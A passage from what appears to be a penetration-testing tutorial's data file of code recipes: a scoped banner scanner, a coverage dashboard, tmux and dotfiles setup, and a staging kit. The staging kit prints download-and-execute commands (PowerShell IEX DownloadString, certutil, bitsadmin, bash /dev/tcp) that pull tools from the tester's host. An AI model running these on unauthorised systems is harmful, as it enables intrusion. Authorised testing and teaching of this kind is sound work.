def probe(host: str, port: int, timeout: float, delay: float) -> Result:
    r = Result(host, port, "unknown")
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.sendall(PROBE)
            s.settimeout(timeout)
            data = s.recv(2048)
        r.state = "open"
        r.banner = data[:120].decode("utf-8", "replace").strip()
        for tok in r.banner.split():
            if tok.count(".") == 2 and tok.replace(".", "").isdigit():
                r.version = tok; break
    except socket.timeout:
        r.state = "filtered"
    except OSError as e:
        r.state = "closed"; r.error = str(e)[:60]
    finally:
        time.sleep(delay)           # be a good citizen: no unbounded rate
    return r

def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("hosts"); ap.add_argument("--port", type=int, default=9100)
    ap.add_argument("--scope", action="append", default=[],
                    help="authorised CIDR; repeatable. REQUIRED.")
    ap.add_argument("--timeout", type=float, default=3.0)
    ap.add_argument("--delay", type=float, default=0.5)
    ap.add_argument("--workers", type=int, default=8)
    ap.add_argument("--out"); a = ap.parse_args()

    if not a.scope:
        print("refusing to run without --scope CIDR", file=sys.stderr); return 3

    hosts = [h.strip() for h in open(a.hosts) if h.strip()]
    allowed = [h for h in hosts if in_scope(h, a.scope)]
    skipped = [h for h in hosts if h not in allowed]
    for h in skipped:
        print(f"SKIPPING {h}: outside authorised scope", file=sys.stderr)

    results = []
    with ThreadPoolExecutor(max_workers=a.workers) as pool:
        futs = {pool.submit(probe, h, a.port, a.timeout, a.delay): h for h in allowed}
        for f in as_completed(futs):
            r = f.result(); results.append(r)
            print(f"{r.host:16} {r.state:9} {r.version or r.banner[:40]}", file=sys.stderr)

    if a.out:
        with open(a.out, "w") as fh:
            json.dump([asdict(r) for r in results], fh, indent=2)
        print(f"wrote {a.out}", file=sys.stderr)
    return 0

if __name__ == "__main__":
    raise SystemExit(main())`,
  parts:[
    { k:'@dataclass Result', v:'A typed result object instead of dicts. It is what makes the JSON output stable and the report generation trivial.' },
    { k:'in_scope()', v:'Scope enforced in code and it fails closed — no scope argument means nothing runs. This is the single most important function in any tool you write.' },
    { k:'socket.create_connection(timeout=)', v:'One call that handles DNS, connect and timeout. Always set a timeout: an unresponsive host must not hang your run.' },
    { k:'time.sleep(delay) in finally', v:'A per-connection delay, applied even on error. This is how you avoid becoming a denial of service against the client\'s service.' },
    { k:'ThreadPoolExecutor(max_workers=8)', v:'Bounded concurrency. Ten thousand threads is not speed, it is a local resource exhaustion bug.' },
    { k:'print(...) to stderr, JSON to file', v:'Human progress and machine output separated, so the JSON can be consumed by the next step without filtering noise.' },
    { k:'except OSError as e: error=str(e)[:60]', v:'Records why a host failed, truncated. "Closed" with no reason is a finding you cannot explain later.' }
  ],
  harden:['Log the exact probe bytes in the output file — a reviewer should be able to replay the request','Never build a probe that modifies the target; if you must, put it behind an explicit flag'],
  next:['Add an output mode that writes one markdown finding per open host with version evidence','Feed the results into a diff between two runs to prove remediation'] },

{ id:'f-payload-kit', title:'A staging kit for the target you actually have', lang:'bash', lvl:'mid', time:'~20 min',
  why:'Transferring a tool onto a host is where engagements stall: no curl, no internet, a Windows box with nothing on it. A kit with one method per situation removes the improvisation.',
  when:['you have a shell but no way to get tools there','egress is filtered or there is no outbound internet','mixing Linux and Windows targets in one engagement'],
  code:`#!/usr/bin/env bash
# stage.sh FILE [PORT]  — print the transfer command for each situation
set -euo pipefail
f="\${1:?usage: stage.sh FILE [PORT]}"
port="\${2:-8080}"
ip="\$(ip -4 route get 1.1.1.1 2>/dev/null | awk '{print \$7; exit}')"

cat <<EOF
# your staging host: \$(hostname)  \$ip:\$port   serving \$(dirname "\$f")
cd "\$(dirname "\$f")" && python3 -m http.server \$port

# --- Linux, has curl or wget -------------------------------------------
curl -sO http://\$ip:\$port/\$(basename "\$f") && chmod +x \$(basename "\$f")
wget -q http://\$ip:\$port/\$(basename "\$f") -O /dev/shm/\$(basename "\$f")

# --- Linux, no downloader: use bash's /dev/tcp -------------------------
exec 3<>/dev/tcp/\$ip/\$port
printf 'GET /\$(basename "\$f") HTTP/1.0\\r\\nHost: x\\r\\n\\r\\n' >&3
tail -n +\$(($(grep -c . /dev/null)+1)) <&3 > /dev/shm/\$(basename "\$f")   # strip headers first

# --- Linux, base64 one-liner (small files only) ------------------------
# on your host:  base64 -w0 "\$f"
# on the target: echo 'BASE64_BLOB' | base64 -d > /dev/shm/\$(basename "\$f") && chmod +x /dev/shm/\$(basename "\$f")

# --- Windows, PowerShell (downloadstring) ------------------------------
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://\$ip:\$port/\$(basename "\$f")')"
powershell -nop -c "(New-Object Net.WebClient).DownloadFile('http://\$ip:\$port/\$(basename "\$f")','C:\\\\Windows\\\\Temp\\\\$(basename "\$f")')"

# --- Windows, certutil / bitsadmin ------------------------------------
certutil -urlcache -f http://\$ip:\$port/\$(basename "\$f") C:\\\\Windows\\\\Temp\\\\$(basename "\$f")
bitsadmin /transfer j /download /priority normal http://\$ip:\$port/\$(basename "\$f") C:\\\\Windows\\\\Temp\\\\$(basename "\$f")

# --- Windows, no PowerShell: SMB from your host ------------------------
impacket-smbserver share "\$(dirname "\$f")" -smb2support -user u -pass p
#   then on the target:  copy \\\\\$ip\\\\share\\\\$(basename "\$f") C:\\\\Windows\\\\Temp\\\\

# --- no egress at all: type it in -------------------------------------
# gzip -9 then base64, paste in chunks, decode on the target:
#   target: printf '%s' 'BASE64_CHUNK' >> /dev/shm/b64 ; base64 -d /dev/shm/b64 | gunzip > tool
EOF

# hash everything you stage, so the target's copy is provably the same file
sha256sum "\$f" | sed 's/^/# staged file: /'`,
  parts:[
    { k:'ip -4 route get 1.1.1.1', v:'Tells you the address the target can actually reach you on — not 127.0.0.1, and not an interface the target cannot route to.' },
    { k:'exec 3<>/dev/tcp/, tail on headers', v:'The fallback when there is no curl or wget: bash\'s own TCP support. It is a real technique on locked-down hosts, and the header stripping is the part everyone gets wrong.' },
    { k:'base64 -w0 then paste', v:'For a target with no egress at all. -w0 (no wrapping) is essential — wrapped base64 with newlines does not decode.' },
    { k:'DownloadString vs DownloadFile', v:'IEX runs the script in memory and touches no disk; DownloadFile leaves an artefact you must remember to remove. Choose deliberately, and note which you used.' },
    { k:'certutil / bitsadmin', v:'Signed Windows binaries that fetch files. Older techniques still work on unmanaged hosts and are logged differently — which is exactly the point.' },
    { k:'impacket-smbserver', v:'The path when PowerShell is blocked entirely. It needs a credential to accept from the target and logs an SMB session on the target — mention it in the report.' },
    { k:'sha256sum', v:'Hash what you staged so you can prove the file on the target is identical. This is the evidence that a dropped tool was yours and what it was.' }
  ],
  harden:['Serve only the directory you intend to — an http.server in your home directory is a data leak','Register every staged file in the teardown list, and hash the copy on the target before you delete it'],
  next:['Add a variant that picks the method automatically based on the target\'s available binaries','Keep a hash manifest of your standard toolset so staged files are always verifiable'] },

{ id:'f-dash', title:'A live dashboard for a long engagement', lang:'python', lvl:'deep', time:'~35 min',
  why:'On a multi-day engagement you lose track of what has been tested. A single page reading your own output files gives you coverage at a glance — and catches the host you forgot.',
  when:['multi-day internal engagements','large internal ranges','when you need to prove coverage to the client'],
  code:`#!/usr/bin/env python3
"""dash.py — one-file coverage dashboard from your engagement directory.
Run it, then open http://127.0.0.1:8000  (binds loopback only, deliberately)."""
import http.server, pathlib, re, urllib.parse, socketserver, html

ROOT = pathlib.Path("scan")
TESTED = re.compile(r"^(\\S+)\\.(nmap|gnmap|xml)$")

def collect() -> dict:
    hosts = {}
    for f in sorted(ROOT.glob("*.*")):
        m = TESTED.match(f.name)
        if not m:
            continue
        h = m.group(1)
        d = hosts.setdefault(h, {"files": 0, "ports": set(), "age": 0})
        d["files"] += 1
        d["age"] = max(d["age"], f.stat().st_mtime)
        for line in f.read_text(errors="replace").splitlines()[:2000]:
            for p in re.findall(r"^(\\d+)/open/tcp", line):
                d["ports"].add(int(p))
    return hosts

def page() -> str:
    hosts = collect()
    rows = []
    for h, d in sorted(hosts.items(), key=lambda kv: -len(kv[1]["ports"])):
        ports = ",".join(str(p) for p in sorted(d["ports"])) or "-"
        flag = "done" if d["files"] >= 2 else "partial"
        rows.append(f"<tr><td>{html.escape(h)}</td><td>{len(d['ports'])}</td>"
                    f"<td>{html.escape(ports[:80])}</td><td>{d['files']}</td>"
                    f"<td class='{flag}'>{flag}</td></tr>")
    return f"""<!doctype html><meta charset=utf-8><title>coverage</title>
<style>body{{font:14px/1.5 ui-monospace,monospace;background:#0b0f0c;color:#9fe8b0;padding:2rem}}
table{{border-collapse:collapse;width:100%}}td,th{{border:1px solid #21452b;padding:.3rem .6rem;text-align:left}}
.done{{color:#6ee7a0}}.partial{{color:#e8d06e}}</style>
<h3>coverage — {len(hosts)} hosts, {sum(len(d['ports']) for d in hosts.values())} open ports</h3>
<table><tr><th>host</th><th>ports</th><th>list</th><th>files</th><th>state</th></tr>
{''.join(rows)}</table>
<p>partial = only one output file: it was swept but not version-scanned. Those are your gaps.</p>"""

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = (page() if urllib.parse.urlparse(self.path).path == "/"
                else "not found").encode()
        self.send_response(200 if body != b"not found" else 404)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers(); self.wfile.write(body)
    def log_message(self, *a): pass          # stay quiet

if __name__ == "__main__":
    if not ROOT.exists():
        raise SystemExit("no scan/ directory here — wrong engagement folder?")
    with socketserver.TCPServer(("127.0.0.1", 8000), H) as s:
        print("http://127.0.0.1:8000  (Ctrl-C to stop)")
        s.serve_forever()`,
  parts:[
    { k:'binds 127.0.0.1', v:'Deliberately loopback-only. A dashboard that binds 0.0.0.0 publishes your client\'s findings to the network you are sitting on — including the coffee shop wifi.' },
    { k:'collect()', v:'Reads your own output files; no new scanning, no extra traffic. The dashboard reports, it does not test.' },
    { k:'files >= 2 -> done', v:'Encodes your methodology as a check: a host that was swept but never version-scanned is partial, and partial hosts are where the missed findings are.' },
    { k:'html.escape()', v:'Service banners are attacker-controlled strings and will contain angle brackets. Escaping them is the difference between a dashboard and a self-inflicted XSS.' },
    { k:'read_text(...)[:2000]', v:'Reads only the head of each file per request. A dashboard should not walk gigabytes of output on every refresh.' },
    { k:'log_message suppressed', v:'Keeps stdout usable. Combined with loopback binding, this is a local utility, not a service.' }
  ],
  harden:['Never expose it outside localhost, and never run it on the client\'s network if their policy forbids listeners','Delete the dashboard and its output before teardown, or leave it in the engagement folder as evidence — never both'],
  next:['Add a per-finding column driven by your findings/*.md files','Add a diff view between the pre-engagement baseline and the current state'] },

{ id:'f-tmux', title:'An engagement layout you can detach from', lang:'bash', lvl:'base', time:'~15 min',
  why:'Losing your SSH connection should cost you nothing. A tmux layout created by a script also means you start each engagement in the same mental shape, with the scan pane, the notes pane and the shell pane already in place.',
  when:['any engagement longer than an hour','remote work over an unreliable link','when you are juggling several targets'],
  code:`#!/usr/bin/env bash
# op.sh ENGAGEMENT_NAME  — build the layout, then get out of the way
set -euo pipefail
name="\${1:?usage: op.sh ENGAGEMENT_NAME}"
cd "\$HOME/engagements/\$name" 2>/dev/null || { echo "no such engagement: \$name" >&2; exit 1; }

tmux new-session -d -s "\$name" -c "\$(pwd)" -n recon
tmux set-option -t "\$name" history-limit 100000
tmux set-option -t "\$name" mouse on
tmux set-option -t "\$name" status-right "#[fg=green]#{pane_current_command} #[fg=white]| #{session_name} | %H:%M"

# 1 recon: sweep on the left, tails on the right
tmux send-keys -t "\$name:recon" "fullscan 192.168.56.0/24 -oA scan/allports" C-m
tmux split-window -h -t "\$name:recon" -c "\$(pwd)"
tmux send-keys   -t "\$name:recon" "tail -f logs/activity.log" C-m

# 2 web, 3 notes, 4 exploit — empty, waiting for you
tmux new-window -t "\$name" -n web  -c "\$(pwd)"
tmux new-window -t "\$name" -n notes -c "\$(pwd)"
tmux send-keys -t "\$name:notes" "vim notes.md" C-m
tmux new-window -t "\$name" -n shell -c "\$(pwd)"

tmux select-window -t "\$name:recon"
tmux attach -t "\$name"`,
  parts:[
    { k:'cd ~/engagements/\$name', v:'One folder per engagement, created by newop. Everything tmux does starts in the right place, so no path mistakes at 02:00.' },
    { k:'history-limit 100000', v:'The default scrollback loses the scan output you wanted to check. Raising it is one line and saves re-running work.' },
    { k:'status-right with pane_current_command', v:'Puts the running command in the status bar, so you can see at a glance whether a scan is still going or has died.' },
    { k:'split-window + tail -f activity.log', v:'Live log beside live scan. When something goes wrong you see it immediately instead of discovering it in the report.' },
    { k:'named windows (web/notes/shell)', v:'The layout encodes your workflow: recon, exploitation, notes, shell. Starting in the same shape is a cognitive shortcut you stop noticing.' },
    { k:'tmux attach at the end', v:'Attach on creation rather than requiring a second command; detach with Ctrl-b d and reattach after any disconnect.' }
  ],
  harden:['Do not put credentials in send-keys — they land in tmux history and the activity log','If the client\'s policy forbids persistent remote sessions, keep tmux local and do not leave it attached while you are away'],
  next:['Add a window per target host generated from live.txt','Add a `tmux kill-session` step to your teardown checklist'] },

{ id:'f-toolrepo', title:'Your own tools directory, packaged and reproducible', lang:'bash', lvl:'deep', time:'~40 min',
  why:'After a year you will have a dozen personal scripts. Without packaging they rot: hardcoded IPs, missing dependencies, and no record of which version ran on which engagement. A tools repo turns ad-hoc scripts into a professional instrument.',
  when:['you have written three or more reusable scripts','you want the same toolset on every machine you work from','someone else needs to run your methodology'],
  code:`# install.sh — usage: ./install.sh   (symlinks ~/tools/* into ~/.local/bin)
#!/usr/bin/env bash
set -euo pipefail
SRC="\$(cd "\$(dirname "\$0")" && pwd)"
BIN="\${BIN:-\$HOME/.local/bin}"
mkdir -p "\$BIN"

echo "== installing from \$SRC =="
command -v shellcheck >/dev/null && find "\$SRC" -name '*.sh' -print0 | xargs -0 -n1 shellcheck || echo "WARN: shellcheck missing"

for f in "\$SRC"/bin/*; do
  [[ -f "\$f" ]] || continue
  name="\$(basename "\$f")"
  case "\$name" in *.sh) name="\${name%.sh}";; esac
  ln -sfn "\$f" "\$BIN/\$name"
  echo "  linked \$name"
done

# dependency check: fail loudly now, not in the middle of an engagement
missing=()
for tool in nmap nxc ffuf nuclei hashcat jq python3; do
  command -v "\$tool" >/dev/null || missing+=("\$tool")
done
(("\${#missing[@]}")) && printf 'MISSING: %s\\n' "\${missing[@]}" || echo "all core tools present"

cat <<'EOF'

conventions
  bin/          one file per tool, no extensions, executable
  lib/          sourced helpers (die, log, in_scope)
  templates/    nuclei/NSE/tmpl files your tools use
  manifest.txt  tool -> sha256, so you can prove what you ran
EOF

# write the manifest so any engagement can record exact tool versions
{ echo "# generated \$(date -Is)"; for f in "\$SRC"/bin/*; do [[ -f "\$f" ]] && sha256sum "\$f"; done; } > "\$SRC/manifest.txt"
echo "manifest written: \$SRC/manifest.txt"`,
  parts:[
    { k:'ln -sfn', v:'Symlinks, not copies. Edit the tool in the repo and every machine sees the change — no stale duplicate living in ~/.local/bin from six months ago.' },
    { k:'shellcheck in the installer', v:'Lint at install time. A shell bug found here costs nothing; the same bug found mid-engagement costs the run.' },
    { k:'the dependency check', v:'Asserts your core toolset exists on the machine you are about to work from. Discovering a missing tool at hour six is a self-inflicted wound.' },
    { k:'manifest.txt with sha256', v:'Proves which version of your tooling ran on an engagement. When a finding is questioned a year later, this is the difference between evidence and memory.' },
    { k:'bin/ lib/ templates/ convention', v:'A fixed structure means you never wonder where a helper lives, and shared code stops being copy-pasted between scripts.' },
    { k:'MISSING printed, not fatal', v:'Missing optional tools should not block installation on a fresh machine; missing core tools should be loud.' }
  ],
  harden:['Keep the repo private: your tools encode your methodology, and some of it is client-derived','Never commit scope files, credentials, loot or client names — add them to .gitignore before the first commit, not after'],
  next:['Add a test target you own and a smoke test that runs each tool against it after install','Tag the manifest into each engagement folder so the exact tooling is archived with the evidence'] },

{ id:'f-dotfiles', title:'Dotfiles you can rebuild in ten minutes', lang:'bash', lvl:'base', time:'~25 min',
  why:'Rebuilding your environment after a lost VM or a fresh work laptop should take minutes, not a weekend. This is also how you keep client data out of your personal config.',
  when:['after a nuked VM','when moving to a new machine','when sharing your setup with a colleague'],
  code:`# bootstrap.sh — fresh machine to working environment, one run
#!/usr/bin/env bash
set -euo pipefail
DOT="\${DOT:-\$HOME/dotfiles}"
git -C "\$DOT" rev-parse --git-dir >/dev/null || { echo "not a git repo: \$DOT" >&2; exit 3; }

link() {                       # link FILE_IN_REPO TARGET_PATH
  local src="\$DOT/\$1" dst="\$2"
  mkdir -p "\$(dirname "\$dst")"
  [[ -e "\$dst" && ! -L "\$dst" ]] && mv "\$dst" "\$dst.bak-\$(date +%s)"
  ln -sfn "\$src" "\$dst"; echo "  \$dst -> \$src"
}

link zshrc          "\$HOME/.zshrc"
link bashrc         "\$HOME/.bashrc"
link tmux.conf      "\$HOME/.tmux.conf"
link gitconfig      "\$HOME/.gitconfig"
link default-nmap   "\$HOME/.nmap/nmap-services.local"    # your port notes
link proxychains    "/etc/proxychains4.conf"             # needs sudo

mkdir -p "\$HOME"/{engagements,tools,wordlists,.local/bin}
echo "layout created under \$HOME"

# secret handling: never in the repo, always in one encrypted place
if command -v gpg >/dev/null; then
  [[ -f "\$HOME/.secrets.gpg" ]] || echo "no ~/.secrets.gpg yet — create it for API keys, never commit them"
fi
# load them explicitly when needed, e.g.
#   eval "\$(gpg -d --quiet ~/.secrets.gpg 2>/dev/null)"
echo "done — open a new shell"`,
  parts:[
    { k:'link() with .bak', v:'Backs up an existing real file before symlinking. A bootstrap that silently overwrites your only working config is a bootstrap you will only run once.' },
    { k:'repository as source of truth', v:'Config lives in git and is symlinked into place, so every machine is the same and changes are tracked. Rebuilding is git clone plus one run.' },
    { k:'mkdir the working layout', v:'engagements/, tools/, wordlists/, ~/.local/bin — the same shape every time, so your scripts can assume paths.' },
    { k:'gpg for secrets', v:'API keys and any client secret live in one encrypted file loaded explicitly by the shell you are using them in — never in the tracked config, never in history.' },
    { k:'the rev-parse guard', v:'Confirms DOT is really your repo before backing anything up. Cheap insurance against running it in the wrong directory.' },
    { k:'nmap-services.local / proxychains links', v:'Environment configuration you will otherwise forget you customised, including the proxies that make pivoting work.' }
  ],
  harden:['Never put engagement names, IPs or client details in dotfiles — that is a leak waiting to happen','Encrypt the machine and keep engagement data in one directory you can remove as a unit'],
  next:['Add a check that verifies every symlink still resolves after a distro upgrade','Version your wordlists by checksum so results are reproducible'] }

];
